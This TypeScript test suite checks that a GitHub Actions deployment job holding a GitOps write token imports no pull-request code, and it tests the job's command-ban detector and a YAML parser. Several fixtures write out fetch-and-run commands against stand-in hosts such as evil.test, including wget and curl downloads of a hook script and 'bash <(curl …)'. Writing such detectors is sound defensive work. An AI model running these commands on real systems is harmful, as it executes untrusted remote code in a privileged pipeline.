    const promoteSteps = steps(DEPLOY_TEST, "promote");
    for (const [index, step] of promoteSteps.entries()) {
      const path = `promote.steps[${index}]`;
      const action = step["uses"];
      if (action !== undefined) {
        expect(asScalar(action, `${path}.uses`), `${path} runs an action other than a checkout`)
          .toMatch(/^actions\/checkout@[0-9a-f]{40}$/);
        expect(
          withBlock(step, path)["repository"],
          `${path} checks out something other than the GitOps repository`,
        ).toBe("hannosirkel/deploys");
      }
      // A `ref:` on this job's checkout would name a revision to fetch, and
      // the only revision this job may ever act on is the one `git commit -m`
      // records -- so no step here may name one at all, structurally, not
      // merely "not the head SHA". `grep -c head_sha` on the whole file finds
      // the string in `build`'s checkout and in the commit message too, both
      // legitimate, so it cannot tell a leak into `promote` from those. Only
      // reading `promote`'s own steps can.
      expect(keysOf(step), `${path} names a revision to check out`).not.toContain("ref");
      for (const [key, value] of Object.entries(withBlock(step, path))) {
        expect(
          scalars(value).join("\n"),
          `${path}.with.${key} hands the head revision to an action`,
        ).not.toMatch(/head_sha/);
      }
    }
  });

  it("names the head revision only as an argument to git commit", () => {
    // The test above reads the declarative surface -- `uses`, any `ref`, and
    // every `with:` input. It does not read `run:` bodies, and `promote`'s
    // env carries `HEAD_SHA` so the commit message can record it. That gap
    // admits a step such as
    //
    //   run: git clone … && git -C head checkout "$HEAD_SHA" && bash head/hook.sh
    //
    // which is head-authored code executing in the one job that holds a write
    // token for hannosirkel/deploys, with every declarative assertion above
    // still green.
    // The folded-in re-verification step (see the previous test) legitimately
    // compares `$head_sha` against the API's own answer, before any
    // credential exists in this job -- that is a read, not an action, and it
    // is what the previous test already pins down by requiring it to run
    // ahead of the token-minting step. Excluded here by step index so this
    // test is about what happens once the job actually holds the credential.
    const recheckIndex = steps(DEPLOY_TEST, "promote").findIndex(
      (step) =>
        typeof step["run"] === "string" &&
        step["run"].includes('any(.labels[]; .name == "deploy-test")'),
    );
    const offending: string[] = [];
    for (const [index, script] of jobScripts(DEPLOY_TEST, "promote")) {
      if (index === recheckIndex) continue;
      for (const command of commands(script)) {
        if (!/head_sha/i.test(command)) continue;
        if (/^git commit -m /.test(command)) continue;
        offending.push(`promote.steps[${index}]: ${command}`);
      }
    }
    expect(offending, "promote acts on the head revision outside its commit message").toEqual([]);
  });

  it("brings no code into the job that holds the GitOps credential", () => {
    expect(codeImportOffences(jobScripts(DEPLOY_TEST, "promote"))).toEqual([]);
  });

  it("runs the base-SHA guard against the test overlay with both digests", () => {
    const promote = jobText(DEPLOY_TEST, "promote");
    expect(promote).toMatch(
      /"\$guard" "\$BACKEND_DIGEST" "\$STOREFRONT_DIGEST" "\$GITHUB_WORKSPACE\/gitops\/lousydeal\/overlays\/test"/,
    );
    expect(promote).not.toMatch(/"\$guard".*lousydeal\/overlays\/live/);
  });

  it("stages, validates and commits only the test overlay", () => {
    const promote = jobText(DEPLOY_TEST, "promote");
    expect(promote).toMatch(/git add lousydeal\/overlays\/test\/kustomization\.yaml/);
    expect(promote).not.toMatch(/git add lousydeal\/overlays\/live\/kustomization\.yaml/);
    expect(promote).not.toMatch(/git add --all|git commit -a\b/);
    expect(promote).toMatch(
      /deploy\(test\): PR #\$\{PR_NUMBER\} \$\{HEAD_SHA\} \$\{BACKEND_DIGEST\} \$\{STOREFRONT_DIGEST\}/,
    );
    expect(promote).not.toMatch(/--force|git rebase/);
  });

  it("renders both overlays and runs the manifest tests before pushing", () => {
    const commit = commitScript(DEPLOY_TEST);
    const order = (needle: string): number => commit.indexOf(needle);
    const push = order("git push");
    for (const before of [
      "bash lousydeal/tests/manifests.sh",
      "kubectl kustomize lousydeal/overlays/live",
      "kubectl kustomize lousydeal/overlays/test",
      "git diff --check",
      "git diff --cached --check",
    ]) {
      expect(order(before), `${before} must run before git push`).toBeGreaterThanOrEqual(0);
      expect(order(before)).toBeLessThan(push);
    }
  });

  it("treats an already-recorded digest pair as nothing to promote", () => {
    // The message is not the behaviour: without the `exit 0` the script falls
    // through to `git commit`, which fails on an empty index and turns a
    // re-labelled pull request into a red run. Assert the early exit itself.
    const commit = commitScript(DEPLOY_TEST);
    expect(commit).toMatch(
      /if \[ -z "\$staged" \]; then\n\s+echo '[^']*nothing to promote'\n\s+exit 0\n\s*fi\n/,
    );
    expect(commit.indexOf("exit 0")).toBeLessThan(commit.indexOf("git commit"));
  });
});

describe("Deploy Test never reaches another application", () => {
  it("names no repository or overlay outside lousydeal and deploys", () => {
    const text = source(DEPLOY_TEST);
    expect(text).not.toMatch(/plepic|servitium/);
    expect(text).not.toMatch(/hannosirkel\/(?!deploys|lousydeal)/);
  });

  it("publishes no image and writes no overlay from the validation workflow", () => {
    const text = source(VALIDATE);
    expect(text).not.toMatch(/pull_request_target/);
    expect(text).not.toMatch(/packages: write/);
    expect(text).not.toMatch(/update-gitops-digest/);
    expect(text).not.toMatch(/lousydeal\/overlays/);
  });
});

describe("the code-import ban itself", () => {
  // The ban is only as good as what it refuses and what it lets through, and
  // neither is observable from a workflow that happens to be written
  // correctly. These drive it with scripts this repository does not contain.

  /** One `run:` body, in the shape `codeImportOffences` reads. */
  function script(...lines: readonly string[]): Array<readonly [number, string]> {
    return [[0, lines.join("\n")] as const];
  }

  it("refuses a fetch written the way this repository writes git commands", () => {
    // The bypass a subcommand-anchored blacklist has. It matches
    // `git\s+(?:clone|fetch|…)`, which requires the subcommand to follow
    // `git` immediately -- so the `-C <path>` form walks straight past it,
    // and `-C` is the form the guard beside this file uses on every one of
    // its git calls.
    expect(
      codeImportOffences(
        script('git -C gitops fetch origin "pull/1/head"', "git -C gitops checkout FETCH_HEAD"),
      ),
    ).toEqual([
      "steps[0] runs git fetch: git -C gitops fetch origin \"pull/1/head\"",
      "steps[0] runs git checkout: git -C gitops checkout FETCH_HEAD",
    ]);
  });

  it("refuses the same fetch written with an absolute path", () => {
    // A command word is a path, and the allowlist reads the command word. An
    // expression anchored on a bare `git` refuses the line above and admits
    // this one -- the identical invocation, spelled the way someone working
    // around the allowlist would spell it.
    expect(
      codeImportOffences(
        script(
          '/usr/bin/git -C gitops fetch origin "pull/1/head"',
          "./tools/git checkout FETCH_HEAD",
        ),
      ),
    ).toEqual([
      'steps[0] runs git fetch: /usr/bin/git -C gitops fetch origin "pull/1/head"',
      "steps[0] runs git checkout: ./tools/git checkout FETCH_HEAD",
    ]);
  });

  it("accepts the git commands the promoting job actually runs", () => {
    expect(
      codeImportOffences(
        script(
          "git config user.name 'lousydeal-deployer[bot]'",
          "git -C gitops diff --check",
          "git add lousydeal/overlays/test/kustomization.yaml",
          'staged="$(git diff --cached --name-only)"',
          "git commit -m 'deploy(test): …'",
          'git push "https://x-access-token:${APP_TOKEN}@github.com/hannosirkel/deploys.git" HEAD:main',
        ),
      ),
    ).toEqual([]);
  });

  it("refuses a forbidden command hidden behind a shell operator", () => {
    expect(codeImportOffences(script("true && git clone https://example.test/x head"))).toEqual([
      "steps[0] runs git clone: git clone https://example.test/x head",
    ]);
  });

  it("does not fail a script for a comment that mentions a forbidden command", () => {
    // The over-reach a naive substring search has. `promote` deliberately
    // runs no package manager, and saying so beside the script that does not
    // run one must not turn the file red.
    expect(
      codeImportOffences(
        script(
          "# This job installs nothing: no npm install, no docker build, no gh api.",
          "git diff --check",
        ),
      ),
    ).toEqual([]);
  });

  it("refuses a fetcher the old blacklist never named", () => {
    // The blacklist this replaced matched only `curl … | sh|bash|node|
    // python`. `wget` was never in it.
    expect(
      codeImportOffences(script("wget -q -O /tmp/hook.sh https://evil.test/hook.sh")),
    ).toEqual(["steps[0] invokes wget: wget -q -O /tmp/hook.sh https://evil.test/hook.sh"]);
  });

  it("refuses a shell interpreter fed by process substitution, which has no pipe to match", () => {
    // `bash <(curl -s https://evil.test/hook.sh)` contains no `|`, so the old
    // blacklist's `curl … \| sh|bash|…` pattern -- anchored on a pipe -- never
    // matched it at all.
    expect(codeImportOffences(script("bash <(curl -s https://evil.test/hook.sh)"))).toEqual([
      "steps[0] invokes a shell interpreter outside its one allowed shape: bash <(curl -s https://evil.test/hook.sh)",
      "steps[0] uses a short curl flag, which this job's real calls never do: bash <(curl -s https://evil.test/hook.sh)",
    ]);
  });

  it("refuses a fetch staged across separate commands, then executed by path", () => {
    // No single line here combines a fetch with an execution, which is what
    // the old blacklist's single-line pattern needed to fire.
    expect(
      codeImportOffences(
        script(
          'curl -sSLo "$RUNNER_TEMP/x.sh" https://evil.test/hook.sh',
          'chmod +x "$RUNNER_TEMP/x.sh"',
          '"$RUNNER_TEMP/x.sh"',
        ),
      ),
    ).toEqual([
      'steps[0] uses a short curl flag, which this job\'s real calls never do: curl -sSLo "$RUNNER_TEMP/x.sh" https://evil.test/hook.sh',
    ]);
  });

  it("accepts the shell and curl invocations promote actually makes", () => {
    expect(
      codeImportOffences(
        script(
          "bash lousydeal/tests/manifests.sh",
          'pull_request="$(curl --fail --silent --show-error --header "Authorization: Bearer $GITHUB_TOKEN" "https://api.github.com/repos/${REPOSITORY}/pulls/${PR_NUMBER}")"',
        ),
      ),
    ).toEqual([]);
  });

  it("refuses an expression interpolated into a shell script", () => {
    // Driven directly, because no workflow in this repository contains one
    // and a rule with no failing case is a rule nothing has ever exercised.
    expect(
      interpolationOffences([["promote.steps[0]", "echo ${{ github.event.pull_request.title }}"]]),
    ).toEqual(["promote.steps[0]"]);
  });

  it("catches the interpolation even when a folded scalar splits it across lines", () => {
    // `>-` folds a block scalar's lines with a single space, so `${{` and
    // `}}` can sit on two different physical lines of the source file. A
    // single-line grep such as `\$\{\{.*\}\}` cannot span that split; the
    // parser folds the scalar first, so the check below sees one string.
    const folded = asScalar(
      asMapping(
        parseYamlSubset(["if: >-", "  echo ${{", "  github.event.pull_request.title }}", ""].join("\n")),
        "document",
      )["if"]!,
      "if",
    );
    expect(folded).toBe("echo ${{ github.event.pull_request.title }}");
    expect(interpolationOffences([["fixture", folded]])).toEqual(["fixture"]);
  });

  it("accepts the same value passed through env, which is how it is written here", () => {
    expect(interpolationOffences([["promote.steps[0]", 'echo "$COMMIT_MESSAGE"']])).toEqual([]);
  });
});

describe("parseYamlSubset", () => {
  // `scripts/workflows.test.ts` trusts this reader completely -- a parser
  // that silently mis-parsed would make every guarantee above pass while
  // meaning nothing. These drive the reader directly, with sources smaller
  // and stranger than any real workflow in this repository.

  it("keeps a literal block scalar's lines, including ones that look like mapping keys", () => {
    // The mis-parse a naive, line-based reader makes: treating every
    // colon-bearing line as a new key regardless of what block it is inside.
    // `run: |` bodies routinely contain lines like `echo "name: value"` or,
    // as here, a line that is syntactically indistinguishable from a real
    // mapping entry -- the reader must know it is inside a literal block and
    // must not re-interpret its content as structure.
    const parsed = asMapping(
      parseYamlSubset(["run: |", "  set -euo pipefail", "  name: not-a-key", "next: value", ""].join("\n")),
      "document",
    );
    expect(asScalar(parsed["run"]!, "run")).toBe("set -euo pipefail\nname: not-a-key");
    expect(parsed["next"]).toBe("value");
  });

  it("folds a folded block scalar onto one line", () => {
    const parsed = asMapping(
      parseYamlSubset(["if: >-", "  first &&", "  second", "runs-on: ubuntu-24.04", ""].join("\n")),
      "document",
    );
    expect(asScalar(parsed["if"]!, "if")).toBe("first && second");
    expect(parsed["runs-on"]).toBe("ubuntu-24.04");
  });

  it("distinguishes an empty mapping from an absent value", () => {
    // `permissions: {}` (a real, empty grant) and a bare `outputs:` (a key
    // with nothing under it) are different facts; collapsing them would make
    // "the workflow declares no permissions at all" indistinguishable from
    // "the workflow declares an `outputs:` key with nothing in it".
    const parsed = asMapping(
      parseYamlSubset(["permissions: {}", "outputs:", "environment: test", ""].join("\n")),
      "document",
    );
    expect(asMapping(parsed["permissions"]!, "permissions")).toEqual({});
    expect(parsed["outputs"]).toBe("");
    expect(parsed["environment"]).toBe("test");
  });

  it("refuses a duplicate mapping key rather than letting the second win silently", () => {
    expect(() => parseYamlSubset(["a: 1", "a: 2", ""].join("\n"))).toThrow(/duplicate mapping key/);
  });

  it("refuses tab indentation, which YAML does not allow at all", () => {
    expect(() => parseYamlSubset(["a:", "\tb: 2", ""].join("\n"))).toThrow(
      /unsupported tab indentation/,
    );
  });

  it("refuses what it does not understand rather than returning nothing", () => {
    // The reader's central guarantee: silence would mean every assertion
    // above ran against an empty document and passed vacuously. A workflow
    // this cannot parse must fail the suite, not pass it.
    expect(() => parseYamlSubset(["a: {b: c}", ""].join("\n"))).toThrow(/unsupported flow mapping/);
    expect(() => parseYamlSubset(["just a scalar", ""].join("\n"))).toThrow(
      /unsupported mapping entry/,
    );
  });

  it("refuses a second document rather than silently merging it into the first", () => {
    // Merging is the dangerous reading: a second document's `permissions:`
    // would silently overwrite -- or be silently overwritten by -- the
    // first's, with nothing in the parsed result to say so.
    expect(() => parseYamlSubset(["a: 1", "---", "b: 2", ""].join("\n"))).toThrow(
      /unsupported second document/,
    );
  });

  it("refuses a mapping entry indented deeper than its siblings, rather than dropping it", () => {
    // The dangerous shape: silently skipping the line would make `b` vanish
    // from the parsed document instead of failing the suite that reads it --
    // exactly the failure mode the file's own header comment exists to
    // prevent.
    expect(() => parseYamlSubset(["a: 1", "  b: 2", ""].join("\n"))).toThrow(
      /unexpected indentation/,
    );
  });

  it("refuses a sequence item indented deeper than its siblings, rather than dropping it", () => {
    expect(() =>
      parseYamlSubset(["branches:", "  - main", "    - extra", ""].join("\n")),
    ).toThrow(/unexpected indentation/);
  });

  it("refuses trailing content the document root did not account for", () => {
    // Fires when the first content line sits deeper than a later, shallower
    // one: the first line's indent decides the level `document()` reads the
    // whole file at, so a later, less-indented line is trailing, not a
    // sibling to merge in.
    expect(() => parseYamlSubset(["  a: 1", "b: 2", ""].join("\n"))).toThrow(
      /unsupported trailing content/,
    );
  });
});

describe("the narrowing helpers", () => {
  it("refuses a sequence where a mapping is required", () => {
    // Without the `Array.isArray` guard, a sequence is a JavaScript object
    // too (`typeof [] === "object"`, and it is not `null`), so `asMapping`
    // would silently accept one and every `job(...)["permissions"]`-style
    // read downstream would key into it by string, reading `undefined` for
    // every property instead of failing.
    expect(() => asMapping(["a"], "jobs")).toThrow(/jobs is not a mapping/);
  });

  it("throw with the path they were given", () => {
    expect(() => asSequence("a", "steps")).toThrow(/steps is not a sequence/);
    expect(() => asScalar({}, "group")).toThrow(/group is not a scalar/);
  });
});
